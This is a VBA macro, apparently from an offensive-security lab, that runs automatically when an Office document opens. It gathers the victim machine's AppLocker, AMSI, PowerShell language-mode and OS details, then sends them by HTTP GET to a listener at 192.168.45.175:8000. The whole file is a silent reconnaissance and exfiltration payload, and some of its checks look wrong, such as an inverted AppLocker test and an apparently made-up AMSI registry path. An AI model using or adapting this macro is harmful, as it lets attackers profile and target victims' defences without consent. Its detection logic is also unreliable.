Option Explicit

Sub AutoOpen()
    CheckSystemStatus
End Sub

Sub DocumentOpen()
    CheckSystemStatus
End Sub

Sub Workbook_Open()
    CheckSystemStatus
End Sub

Sub AutoExec()
    CheckSystemStatus
End Sub

' Main function that calls the separate functions
Sub CheckSystemStatus()
    Dim strUrl As String
    Dim applockerStatus As String
    Dim osStatus As String
    Dim amsiStatus As String
    Dim clmStatus As String
    Dim result As String
    Dim hReq As Object
    
    ' Call separate functions to get status
    applockerStatus = CheckAppLockerStatus()
    Debug.Print "applockerStatus: " & applockerStatus
    osStatus = GetOperatingSystem()
    Debug.Print "osStatus: " & osStatus
    amsiStatus = CheckAMSIStatus()
    Debug.Print "amsiStatus: " & amsiStatus
    clmStatus = GetPowerShellLanguageMode()
    Debug.Print "clmStatus: " & clmStatus

    ' Combine results
    result = "AppLocker=" & applockerStatus & "&AMSI=" & amsiStatus & "&CLM=" & clmStatus & "&OS=""" & osStatus & """"
    ' Debug.Print result
    ' Change URL
    strUrl = "http://192.168.45.175:8000/status.txt?" & result

    ' Send GET request
    Set hReq = CreateObject("MSXML2.XMLHTTP")
    
    On Error Resume Next
    With hReq
        .Open "GET", strUrl, False
        .Send
    End With
    On Error GoTo 0
    
    ' Clean up
    Set hReq = Nothing
    
End Sub

' Function to check AppLocker status
Function CheckAppLockerStatus() As String
    Dim WindowShell As Object
    Dim regValue
    Dim status As String
    
    Set WindowShell = CreateObject("WScript.shell")
    
    On Error Resume Next
    regValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe")
    
    If Err <> 0 Then
        status = "on"   ' AppLocker is on (registry key not found)
    Else
        status = "off"  ' AppLocker is off (registry key found)
    End If
    
    On Error GoTo 0
    Set WindowShell = Nothing
    
    CheckAppLockerStatus = status
End Function

' Function to get the operating system name and version
Function GetOperatingSystem() As String
    ' Returns: OS information as string (e.g., "Windows 10 Pro 64-bit (10.0.19045)")
    
    Dim objWMIService As Object
    Dim colItems As Object
    Dim objItem As Object
    Dim osName As String
    Dim osVersion As String
    Dim osArchitecture As String
    Dim computerSystem As Object
    Dim osType As String
        
    ' Connect to WMI
    Set objWMIService = GetObject("winmgmts:\\.\root\CIMV2")
    
    ' Get operating system information
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem", , 48)
    
    For Each objItem In colItems
        osName = objItem.Caption
        osVersion = objItem.Version
        osArchitecture = objItem.osArchitecture
    Next objItem
    
    ' Get system type (64-bit or 32-bit)
    Set computerSystem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem", , 48)
    
    For Each objItem In computerSystem
        If objItem.SystemType Like "*64*" Then
            osType = "64-bit"
        Else
            osType = "32-bit"
        End If
    Next objItem
    
    ' If OSArchitecture is available, use it instead
    If osArchitecture <> "" Then
        osType = osArchitecture
    End If
    
    ' Construct the OS string
    GetOperatingSystem = osName & " " & osType & " (Version: " & osVersion & ")"
    
End Function


' Function to get AMSI status
Function CheckAMSIStatus() As String
    Dim WindowShell As Object
    Dim amsiRegValue
    Dim status As String
    
    status = "unknown"  ' Default status
    
    Set WindowShell = CreateObject("WScript.shell")
    
    On Error Resume Next
    
    ' Method 1: Check AMSI scanner enablement
    amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\FeatureFeatures\BypassAMSI")
    
    If Err.Number = 0 Then
        If amsiRegValue = 1 Then
            status = "disabled"  ' AMSI disabled
        Else
            status = "enabled"   ' AMSI enabled
        End If
    Else
        Err.Clear
        
        ' Method 2: Check for AMSI provider registration
        amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers")
        
        If Err.Number = 0 Then
            status = "enabled"   ' AMSI providers found
        Else
            status = "likely_enabled"  ' Default to enabled (most modern Windows systems)
        End If
    End If
    
    Set WindowShell = Nothing
    On Error GoTo 0
    
    CheckAMSIStatus = status
End Function

' Function to get CLM
Function GetPowerShellLanguageMode() As String
    ' Returns: "FullLanguage", "ConstrainedLanguage", "RestrictedLanguage", "NoLanguage", or "Unknown"
    
    Dim ps As Object
    Dim result As String
    Dim output As String
    Dim languageMode As String
    Dim shell As Object
    Dim exec As Object
        
    ' Crear objeto Shell
    Set shell = CreateObject("WScript.Shell")
    
    ' Ejecutar comando de PowerShell para obtener LanguageMode
    Set exec = shell.exec("powershell -Command ""$ExecutionContext.SessionState.LanguageMode""")
    
    ' Leer la salida
    output = exec.StdOut.ReadAll()
    If output <> "" Then
        GetPowerShellLanguageMode = output
    Else
        GetPowerShellLanguageMode = "Unknown"
    End If
End Function
